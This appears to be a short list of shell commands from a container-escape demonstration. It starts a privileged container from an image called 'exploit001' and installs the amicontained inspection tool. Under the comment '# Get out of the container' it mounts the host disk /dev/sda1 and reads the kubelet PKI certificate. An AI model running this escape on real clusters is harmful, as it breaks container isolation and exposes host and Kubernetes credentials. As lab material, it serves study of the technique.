docker run --rm -it --privileged -p 8080:80 denhamparry/exploit001:0.0.1
docker exec -it 46d bash
__get() { local URL="$1"; [ ! -f "${URL}" ]&& curl -LO curl -LO ${URL}; };
__get https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64
mv amicontained-linux-amd64 /usr/local/bin/amicontained
export AMICONTAINED_SHA256="4e32545f68f25bcbcd4cce82743e916a054e1686df44fab68420fc9f94f80b21"
echo "${AMICONTAINED_SHA256}  /usr/local/bin/amicontained" | sha256sum -c -
chmod a+x "/usr/local/bin/amicontained"
amicontained

# Get out of the container

ls /dev
df -h
mkdir -p /tmp/host
ls /tmp/host
mount /dev/sda1 /tmp/host
ls /tmp/host
ls tmp/host/kubelet
ls tmp/host/kubelet/pki
cat tmp/host/kubelet/pki/kubelet.crt
